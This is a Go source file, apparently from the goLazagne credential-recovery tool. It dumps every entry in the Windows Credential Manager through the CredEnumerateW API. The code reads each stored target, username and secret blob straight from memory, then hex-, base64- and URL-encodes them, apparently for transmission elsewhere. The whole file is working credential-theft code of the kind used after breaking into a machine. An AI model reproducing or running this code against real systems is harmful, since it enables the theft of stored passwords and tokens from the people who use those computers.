package windows

import (
	"encoding/base64"
	"encoding/hex"
	"log"
	"net/url"
	"syscall"
	"unicode/utf16"
	"unsafe"

	"github.com/kerbyj/goLazagne/common"
)

/*
 * Windows data types
 *
 * https://docs.microsoft.com/en-us/windows/desktop/winprog/windows-data-types
 */

/*
 * FILETIME structure
 *
 * https://docs.microsoft.com/en-us/windows/desktop/api/minwinbase/ns-minwinbase-filetime
 */
type winFileTime struct {
	LowDateTime  uint32
	HighDateTime uint32
}

/*
 * CREDENTIALW structure
 *
 * https://docs.microsoft.com/en-us/windows/desktop/api/wincred/ns-wincred-credentialw
 */
type winCred struct {
	Flags              uint32
	Type               uint32
	TargetName         uintptr
	Comment            uintptr
	LastWritten        winFileTime
	CredentialBlobSize uint32
	CredentialBlob     uintptr
	Persist            uint32
	AttributeCount     uint32
	Attributes         uintptr
	TargetAlias        uintptr
	UserName           uintptr
}

// Structure for parsed data from windows credential manager
type ParsedCred struct {
	Target string
	User   string
	Blob   string
}

var (
	dlladvapi32    = syscall.NewLazyDLL("Advapi32.dll")
	credEnumerateW = dlladvapi32.NewProc("CredEnumerateW")
	credFree       = dlladvapi32.NewProc("CredFree")
)

func extractString(p uintptr) string {
	if p == 0 {
		return ""
	}

	out := make([]uint16, 0, 64)

	for i := 0; ; i += 2 {
		c := *((*uint16)(unsafe.Pointer(p + uintptr(i))))

		if c == 0 {
			break
		}

		out = append(out, c)
	}

	return string(utf16.Decode(out))
}

func extractBytes(p uintptr, len uintptr) []byte {
	if p == 0 {
		return []byte{}
	}

	out := make([]byte, len)

	for i := range out {
		out[i] = *((*byte)(unsafe.Pointer(p + uintptr(i))))
	}

	return out
}

func parseCred(c *winCred) ParsedCred {
	blob := extractBytes(c.CredentialBlob,
		(uintptr)(c.CredentialBlobSize))

	return ParsedCred{
		Target: extractString(c.TargetName),
		User:   extractString(c.UserName),
		Blob:   hex.EncodeToString(blob),
	}
}

// Dump data with credEnumerateW winapi function
func DumpCreds() (out []ParsedCred, err error) {
	var ncreds, creds uintptr

	/*
	 * CredEnumerateW function
	 *
	 * https://docs.microsoft.com/en-us/windows/desktop/api/wincred/nf-wincred-credenumeratew
	 */
	r1, _, lastErr := credEnumerateW.Call(0, 0,
		(uintptr)(unsafe.Pointer(&ncreds)),
		(uintptr)(unsafe.Pointer(&creds)))
	if r1 != 1 {
		return nil, lastErr
	}

	/*
	 * Iterate over returned pointers to CREDENTIALW structures
	 */
	for i := 0; i < int(ncreds); i++ {
		off := unsafe.Sizeof(creds) * uintptr(i)
		wcp := *(*uintptr)(unsafe.Pointer(creds + off))
		parsedCred := parseCred((*winCred)(unsafe.Pointer(wcp)))
		out = append(out, parsedCred)
	}

	/*
	 * CredFree function
	 *
	 * https://docs.microsoft.com/en-us/windows/desktop/api/wincred/nf-wincred-credfree
	 */
	credFree.Call(creds)

	return out, nil
}

// Start credential manager data extract
func CredManModuleStart() common.ExtractCredentialsResult {

	var unsuccessfulResult = common.ExtractCredentialsResult{
		Success: false,
		Data:    []common.UrlNamePass{},
	}

	/*
		Dump credman with WinApi function
	*/

	creds, err := DumpCreds()

	if err != nil {
		log.Println(err)
		return unsuccessfulResult
	}

	var (
		Result common.ExtractCredentialsResult
		data   []common.UrlNamePass
	)

	for i := range creds {

		var encodedBlob = url.QueryEscape(base64.StdEncoding.EncodeToString([]byte(creds[i].Blob)))
		var encodedTarget = url.QueryEscape(base64.StdEncoding.EncodeToString([]byte(creds[i].Target)))
		var encodedUsername = url.QueryEscape(base64.StdEncoding.EncodeToString([]byte(creds[i].User)))

		data = append(data, common.UrlNamePass{
			Url:      encodedTarget,
			Username: encodedUsername,
			Pass:     encodedBlob,
		})
	}

	if len(data) == 0 {
		Result.Success = false
		return unsuccessfulResult
	}

	Result.Data = data
	Result.Success = true
	return Result
}
